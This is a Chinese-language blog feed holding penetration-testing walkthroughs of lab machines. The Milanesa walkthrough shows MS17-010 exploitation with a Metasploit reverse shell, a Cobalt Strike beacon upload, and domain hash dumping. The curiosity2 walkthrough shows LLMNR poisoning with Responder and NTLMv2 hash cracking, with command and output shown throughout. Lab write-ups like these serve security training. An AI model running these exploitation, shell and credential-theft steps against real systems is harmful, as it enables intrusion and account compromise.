<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>

<br><a data-tooltip-position="top" aria-label="4.1. mimikatz抓取域控hash" data-href="#4.1. mimikatz抓取域控hash" href="https://www.c1trus.top/about:blank#4.1._mimikatz抓取域控hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatz抓取域控hash</a>


<br><a data-tooltip-position="top" aria-label="5. 网站利用" data-href="#5. 网站利用" href="https://www.c1trus.top/about:blank#5._网站利用" class="internal-link" target="_self" rel="noopener nofollow">5. 网站利用</a><br>
- <a data-tooltip-position="top" aria-label="5.1. 目录扫描" data-href="#5.1. 目录扫描" href="https://www.c1trus.top/about:blank#5.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">5.1. 目录扫描</a><br>
- <a data-tooltip-position="top" aria-label="5.2. 登录框利用" data-href="#5.2. 登录框利用" href="https://www.c1trus.top/about:blank#5.2._登录框利用" class="internal-link" target="_self" rel="noopener nofollow">5.2. 登录框利用</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️️
<br><br>┌──(root㉿kali)-[~]
└─# fscan -h 20.20.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] 开始信息扫描...
[*] CIDR范围: 20.20.20.0-20.20.20.255
[*] 已生成IP范围: 20.20.20.0 - 20.20.20.255
[*] 已解析CIDR 20.20.20.0/24 -&gt; IP范围 20.20.20.0-20.20.20.255
[*] 最终有效主机数量: 256
[+] 目标 20.20.20.1      存活 (ICMP)
[+] 目标 20.20.20.7      存活 (ICMP)
[+] 目标 20.20.20.4      存活 (ICMP)
[+] 目标 20.20.20.2      存活 (ICMP)
[+] 目标 20.20.20.6      存活 (ICMP)
[+] 目标 20.20.20.3      存活 (ICMP)
[+] 目标 20.20.20.5      存活 (ICMP)
[+] ICMP存活主机数量: 7
[*] 共解析 218 个有效端口
[+] 端口开放 20.20.20.7:22
[+] 端口开放 20.20.20.3:80
[+] 端口开放 20.20.20.6:80
[+] 端口开放 20.20.20.6:139
[+] 端口开放 20.20.20.5:139
[+] 端口开放 20.20.20.5:135
[+] 端口开放 20.20.20.4:135
[+] 端口开放 20.20.20.4:139
[+] 端口开放 20.20.20.6:445
[+] 端口开放 20.20.20.3:443
[+] 端口开放 20.20.20.3:139
[+] 端口开放 20.20.20.3:135
[+] 端口开放 20.20.20.1:135
[+] 端口开放 20.20.20.6:135
[+] 端口开放 20.20.20.1:139
[+] 端口开放 20.20.20.4:445
[+] 端口开放 20.20.20.5:445
[+] 端口开放 20.20.20.3:445
[+] 端口开放 20.20.20.1:445
[+] 端口开放 20.20.20.4:88
[+] 端口开放 20.20.20.3:3306
[+] 端口开放 20.20.20.1:7680
[+] 端口开放 20.20.20.1:7890
[+] 端口开放 20.20.20.6:3306
[+] 端口开放 20.20.20.5:8080
[+] 存活端口数量: 25
[*] 开始漏洞扫描...
[!] 扫描错误 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
[!] 扫描错误 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
[!] 扫描错误 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
[*] NetInfo
[*] 20.20.20.1
   [-&gt;] yu
   [-&gt;] 192.168.1.1
   [-&gt;] 192.168.8.1
   [-&gt;] 192.168.56.1
   [-&gt;] 10.16.9.188
   [-&gt;] 10.10.10.1
   [-&gt;] 20.20.20.1
   [-&gt;] 30.30.30.1
   [-&gt;] 2409:8760:1e81:10::2:6dc6
[!] 扫描错误 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
[*] NetBios 20.20.20.1      WORKGROUP\YU
[*] NetInfo
[*] 20.20.20.5
   [-&gt;] Milanesa1
   [-&gt;] 30.30.30.5
   [-&gt;] 10.10.10.5
   [-&gt;] 20.20.20.5
   [-&gt;] 192.168.56.112
[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
[*] NetInfo
[*] 20.20.20.3
   [-&gt;] WIN-SEUNA992K57
   [-&gt;] 192.168.56.11
   [-&gt;] 10.10.10.3
   [-&gt;] 20.20.20.3
   [-&gt;] 30.30.30.3
[!] 扫描错误 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
[*] 网站标题 http://20.20.20.6         状态码:503 长度:326    标题:Service Unavailable
[*] NetInfo
[*] 20.20.20.6
   [-&gt;] WIN-11ULVN883E8
   [-&gt;] 192.168.56.12
   [-&gt;] 10.10.10.6
   [-&gt;] 20.20.20.6
   [-&gt;] 30.30.30.6
[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
[*] NetInfo
[*] 20.20.20.4
   [-&gt;] WIN-M5KV71CEGO8
   [-&gt;] 30.30.30.6
   [-&gt;] 20.20.20.4
   [-&gt;] 30.30.30.4
   [-&gt;] 10.10.10.4
[!] 扫描错误 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
[*] 网站标题 https://20.20.20.3        状态码:302 长度:0      标题:无标题 重定向地址: https://20.20.20.3/dashboard/
[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
[*] 网站标题 http://20.20.20.3         状态码:302 长度:0      标题:无标题 重定向地址: http://20.20.20.3/dashboard/
[*] 网站标题 http://20.20.20.5:8080    状态码:200 长度:4755   标题:Milanesas Argentinas
[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
[*] 网站标题 http://20.20.20.1:7890    状态码:400 长度:0      标题:无标题
[*] 网站标题 http://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
[!] 扫描错误 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
[*] 网站标题 https://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
[!] 扫描错误 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] 扫描错误 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] 扫描错误 20.20.20.7:22 - 扫描总时间超时: context deadline exceeded
[+] 扫描已完成: 25/25
[*] 扫描结束,耗时: 12.122585738s


<br>整理一下<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
20.20.20.4  WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
 
 域名 hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br><br>fscan扫描出域控主机 存在ms17-010<br>
先配置hosts<br>msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
                                                                lank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
                                                                t.com/docs/using-metasploit/basics/using-metas
                                                                ploit.html
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
                                                                retty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                 (ADMIN$,C$,...) or a normal read/write folder
                                                                 share
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
lhost =&gt; 20.20.20.7
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
rhosts =&gt; 20.20.20.4
msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on 20.20.20.7:4444
[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
[*] 20.20.20.4:445 - Built a write-what-where primitive...
[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 20.20.20.4:445 - Selecting PowerShell target
[*] 20.20.20.4:445 - Executing the payload...
[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 20.20.20.4
[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; shell
Process 1592 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system


c:\Users\Administrator\Documents&gt;type root_flag.txt
type root_flag.txt
{5de4808fa7cec46234dbccc6c46fa6c84}

<br>拿下，这里我们传一个cs的后面并运行。方便后续利用<br>meterpreter &gt; upload 3333.exe
[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
meterpreter &gt; shell
Process 1596 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32&gt;3333.exe
3333.exe

<br><img alt="assets/Pasted image 20241221135649.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"><br><br>利用CS模块查看一下域内的主机<br>[12/21 14:01:39] [+] =========== 查询域主机 ==========
[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
[12/21 14:01:39] [+] host called home, sent: 47 bytes
[12/21 14:01:39] [+] received output:
"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"

<br>可以发现除了DC WIN-M5KV71CEGO8 外 还有一台主机 WIN-SEUNA992K57 也在域内<br>
WIN-SEUNA992K57对应的ip是 20.20.20.3 <br>尝试使用域控的hash直接连接 这台主机<br><br>[12/21 14:05:00] beacon&gt; hashdump
[12/21 14:05:00] [*] Tasked beacon to dump hashes
[12/21 14:05:00] [+] host called home, sent: 82541 bytes
[12/21 14:05:01] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
<br>然后尝试使用域控的HASH 直接pth 但是发现不行<br><br>先看下现在的信息<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
20.20.20.4 【已拿下】 WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
 
 域名 hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br>我们发现另外3个主机都开放了网页服务。<br>
对这几个都进行一下目录扫描<br><br>┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
└─# dirsearch -u http://20.20.20.3
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt

Target: http://20.20.20.3/

[01:55:52] Starting:

[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
[01:56:01] 200 -    5KB - /dashboard/
[01:56:01] 200 -   31KB - /dashboard/faq.html
[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
[01:56:01] 200 -    6KB - /dashboard/howto.html
[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
[01:56:02] 200 -   30KB - /favicon.ico
[01:56:13] 200 -  776B  - /Webalizer/
[01:56:14] 200 -  768B  - /xampp/


┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
└─# dirsearch -u http://20.20.20.5:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt

Target: http://20.20.20.5:8080/

[01:56:22] Starting:

[01:56:36] 200 -    1KB - /login.aspx


┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
└─# dirsearch -u http://20.20.20.6
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt

Target: http://20.20.20.6/

[01:57:34] Starting:

Task Completed


<br><br>发现 20.20.20.5:8080 存在一个 /login.aspx<br>
随便输入账号密码发现都可以登录，而且登录后都是一个报错界面<br>
<img alt="assets/Pasted image 20241221150209.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150209.png"><br>
这可能就不是一个真的登录框<br>
将报错信息发给gpt 告诉我 指定的文件路径或命令没有找到<br>
<img alt="assets/Pasted image 20241221150320.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150320.png"><br>
经过尝试后 发现这里是一个命令执行的利用<br>
<img alt="assets/Pasted image 20241221150514.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150514.png"><br>然后在网站的日志里面可以获取到用户的密码<br>
<img alt="assets/Pasted image 20241221152138.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152138.png"><br>
/login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
登录后需要重置密码 因为密码过期了<br>Warning
这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
<br>进来后桌面就有用户flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br>剧情<br>
著名制药公司“Pildoritas”遭遇了一场毁灭性的网络攻击。<br>
在看似安全稳固的环境中，一群黑客成功侵入了他们的系统，将公司几乎完全摧毁成数字废墟。<br>
公司的宝贵知识、记录和运营数据要么被删除，要么被加密。然而，攻击者在离开时留下了一条线索——<br>
唯一的线索是一个文件：一份以 PCAP 格式保存的网络流量捕获文件。<br>
现在，“Pildoritas”的命运掌握在你的手中。你是否拥有分析该文件、揭示真相并复现事件的能力？
<br>]]></description><link>https://www.c1trus.top/24-渗透/thl/7.pildoritas.html</link><guid isPermaLink="false">24-渗透/THL/7.Pildoritas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[6.curiosity2]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. ntlm中毒攻击" data-href="#2.2. ntlm中毒攻击" href="https://www.c1trus.top/about:blank#2.2._ntlm中毒攻击" class="internal-link" target="_self" rel="noopener nofollow">2.2. ntlm中毒攻击</a>
<br><a data-tooltip-position="top" aria-label="2.3. 爆破Hash" data-href="#2.3. 爆破Hash" href="https://www.c1trus.top/about:blank#2.3._爆破Hash" class="internal-link" target="_self" rel="noopener nofollow">2.3. 爆破Hash</a>


<br><a data-tooltip-position="top" aria-label="3. sqlcmd操作" data-href="#3. sqlcmd操作" href="https://www.c1trus.top/about:blank#3._sqlcmd操作" class="internal-link" target="_self" rel="noopener nofollow">3. sqlcmd操作</a>
<br><a data-tooltip-position="top" aria-label="4. bloodhound分析域内环境" data-href="#4. bloodhound分析域内环境" href="https://www.c1trus.top/about:blank#4._bloodhound分析域内环境" class="internal-link" target="_self" rel="noopener nofollow">4. bloodhound分析域内环境</a>
<br><a data-tooltip-position="top" aria-label="5. 数据库获取信息" data-href="#5. 数据库获取信息" href="https://www.c1trus.top/about:blank#5._数据库获取信息" class="internal-link" target="_self" rel="noopener nofollow">5. 数据库获取信息</a>
<br><a data-tooltip-position="top" aria-label="6. 密码喷涂" data-href="#6. 密码喷涂" href="https://www.c1trus.top/about:blank#6._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">6. 密码喷涂</a>
<br><a data-tooltip-position="top" aria-label="7. 破解kdbx数据库文件" data-href="#7. 破解kdbx数据库文件" href="https://www.c1trus.top/about:blank#7._破解kdbx数据库文件" class="internal-link" target="_self" rel="noopener nofollow">7. 破解kdbx数据库文件</a>
<br><a data-tooltip-position="top" aria-label="8. DCSync" data-href="#8. DCSync" href="https://www.c1trus.top/about:blank#8._DCSync" class="internal-link" target="_self" rel="noopener nofollow">8. DCSync</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# fscan -h 192.168.56.116

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.116:135 open
192.168.56.116:139 open
192.168.56.116:445 open
192.168.56.116:88 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.56.116  [+] DC:CONS\WIN-C73PROQLRHL
[*] NetInfo
[*]192.168.56.116
   [-&gt;]WIN-C73PROQLRHL
   [-&gt;]192.168.56.116
   [-&gt;]10.16.41.51
   [-&gt;]2409:8760:1e81:10::39d9
已完成 4/4
[*] 扫描结束,耗时: 2.092922428s

┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# nmap -sCV 192.168.56.116
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:57 CST
Nmap scan report for 192.168.56.116
Host is up (0.00029s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-10 16:57:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
MAC Address: 08:00:27:C1:EE:2F (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c1:ee:2f (Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2024-12-10T16:58:21
|_  start_date: 2024-12-10T16:56:53
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.57 seconds

<br><br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# responder -I eth0


[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
[SMB] NTLMv2-SSP Username : cons\Appolonia
[SMB] NTLMv2-SSP Hash     : Appolonia::cons:49ad08d5b95f487e:7981C671B6509FFED9036CB51727F74D:010100000000000080A60B552D4BDB01CEC743A0ED3C72F20000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
[*] [NBT-NS] Poisoned answer sent to 192.168.56.116 for name SQLDATABABASE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
[SMB] NTLMv2-SSP Username : cons\sqldb
[SMB] NTLMv2-SSP Hash     : sqldb::cons:d7ed9707c16853ff:95D5F1D9D93D1C77A5C6B4E03B2BACDC:010100000000000080A60B552D4BDB017F14781EF42811660000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A001000000000000000000000000000000000000900240063006900660073002F00530051004C004400610074006100620061006200610073006500000000000000000000000000

<br><br>
根据这个作者的习惯。rockyou一般都是爆破不出来的<br>
换一个字典爆破
<br>┌──(root㉿kali)-[/home/kali/thl/curiosity2]
└─# hashcat -a 0 -m 5600 appolonia_ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt
